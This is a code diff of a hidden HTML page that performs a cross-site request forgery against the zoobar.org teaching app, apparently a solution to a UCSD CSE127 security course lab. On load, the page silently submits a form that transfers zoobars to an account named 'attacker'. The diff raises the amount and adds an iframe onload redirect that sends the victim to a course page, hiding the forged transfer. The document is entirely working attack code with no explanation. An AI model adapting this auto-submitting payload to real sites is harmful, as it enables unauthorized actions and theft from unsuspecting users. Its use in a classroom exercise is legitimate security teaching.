@@ -4,27 +4,29 @@
   </head>
 
   <body style="visibility: hidden">
-    <iframe name="form_target" width="700" height="500" style="visibility: hidden">
+    <iframe name="form_target" width="700" height="500" style="visibility: hidden" onLoad="iframe_onload()">
     </iframe>
     
     <form name="attack_b" target="form_target" action="http://zoobar.org/transfer.php" method="post">
-      <input type="hidden" name="zoobars" value="1">
+      <input type="hidden" name="zoobars" value="10">
       <input type="hidden" name="recipient" value="attacker">
-      <input type="submit" name="submission" value="Execute" id="submit" onClick="redirect()">
+      <input type="submit" name="submission" value="Execute" id="submit">
     </form>
     
     <script>
+      var redirect_flag = false;
       document.onload = execute();
-      //document.getElementById("submit").click();
 
       function execute()
       {
+        redirect_flag = true;
         document.getElementById("submit").click();
       }
 
-      function redirect()
+      function iframe_onload()
       {
-        window.location.assign("http://cseweb.ucsd.edu/classes/sp14/cse127-a")
+        if(redirect_flag) 
+          window.location.assign("http://cseweb.ucsd.edu/classes/sp14/cse127-a")
       }
 
     </script>
